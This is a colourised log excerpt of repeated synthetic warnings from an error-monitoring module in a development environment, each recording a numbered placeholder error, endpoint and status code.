WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860578Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3218'[0m [36merror_type[0m=[35merror_type_18[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_18[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m418[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860627Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3219'[0m [36merror_type[0m=[35merror_type_19[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_19[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m419[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860675Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3220'[0m [36merror_type[0m=[35merror_type_20[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_20[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m420[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860723Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3221'[0m [36merror_type[0m=[35merror_type_21[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_21[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m421[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860771Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3222'[0m [36merror_type[0m=[35merror_type_22[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_22[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m422[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860819Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3223'[0m [36merror_type[0m=[35merror_type_23[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_23[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m423[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860866Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3224'[0m [36merror_type[0m=[35merror_type_24[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_24[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m424[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860914Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3225'[0m [36merror_type[0m=[35merror_type_25[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_25[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m425[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.860962Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3226'[0m [36merror_type[0m=[35merror_type_26[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_26[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m426[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861009Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3227'[0m [36merror_type[0m=[35merror_type_27[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_27[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m427[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861056Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3228'[0m [36merror_type[0m=[35merror_type_28[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_28[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m428[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861103Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3229'[0m [36merror_type[0m=[35merror_type_29[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_29[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m429[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861151Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3230'[0m [36merror_type[0m=[35merror_type_30[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_30[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m430[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861199Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3231'[0m [36merror_type[0m=[35merror_type_31[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_31[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m431[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861246Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3232'[0m [36merror_type[0m=[35merror_type_32[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_32[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m432[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861293Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3233'[0m [36merror_type[0m=[35merror_type_33[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_33[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m433[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861340Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3234'[0m [36merror_type[0m=[35merror_type_34[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_34[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m434[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861413Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3235'[0m [36merror_type[0m=[35merror_type_35[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_35[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m435[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861502Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3236'[0m [36merror_type[0m=[35merror_type_36[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_36[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m436[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861562Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3237'[0m [36merror_type[0m=[35merror_type_37[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_37[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m437[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861615Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3238'[0m [36merror_type[0m=[35merror_type_38[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_38[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m438[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861667Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3239'[0m [36merror_type[0m=[35merror_type_39[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_39[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m439[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861718Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3240'[0m [36merror_type[0m=[35merror_type_40[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_40[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m440[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861767Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3241'[0m [36merror_type[0m=[35merror_type_41[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_41[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m441[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861817Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3242'[0m [36merror_type[0m=[35merror_type_42[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_42[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m442[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861865Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3243'[0m [36merror_type[0m=[35merror_type_43[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_43[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m443[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861917Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3244'[0m [36merror_type[0m=[35merror_type_44[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_44[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m444[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.861964Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3245'[0m [36merror_type[0m=[35merror_type_45[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_45[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m445[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862012Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3246'[0m [36merror_type[0m=[35merror_type_46[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_46[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m446[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862060Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3247'[0m [36merror_type[0m=[35merror_type_47[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_47[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m447[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862109Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3248'[0m [36merror_type[0m=[35merror_type_48[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_48[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m448[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862159Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m65[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3249'[0m [36merror_type[0m=[35merror_type_49[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_49[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m449[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862241Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3250'[0m [36merror_type[0m=[35merror_type_0[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_50[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m450[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862332Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3251'[0m [36merror_type[0m=[35merror_type_1[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_51[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m451[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862393Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3252'[0m [36merror_type[0m=[35merror_type_2[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_52[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m452[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862450Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3253'[0m [36merror_type[0m=[35merror_type_3[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_53[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m453[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862501Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3254'[0m [36merror_type[0m=[35merror_type_4[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_54[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m454[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862551Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3255'[0m [36merror_type[0m=[35merror_type_5[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_55[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m455[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862600Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3256'[0m [36merror_type[0m=[35merror_type_6[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_56[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m456[0m
WARNING  app.core.logging:error_monitoring.py:100 [2m2025-07-05T14:23:43.862648Z[0m [[33m[1mwarning  [0m] [1merror_monitored               [0m [[0m[1m[34mapp.core.logging[0m][0m [36mclient_ip[0m=[35munknown[0m [36mcount_in_window[0m=[35m66[0m [36menvironment[0m=[35mdevelopment[0m [36merror_message[0m=[35m'Error message 3257'[0m [36merror_type[0m=[35merror_type_7[0m [36mfilename[0m=[35merror_monitoring.py[0m [36mfunc_name[0m=[35mrecord_error[0m [36mlineno[0m=[35m100[0m [36mmodule[0m=[35merror_monitoring[0m [36mpath[0m=[35m/api/endpoint_57[0m [36mpathname[0m=[35m/home/paul/boardroom-repo/app/core/error_monitoring.py[0m [36mstatus_code[0m=[35m457[0m
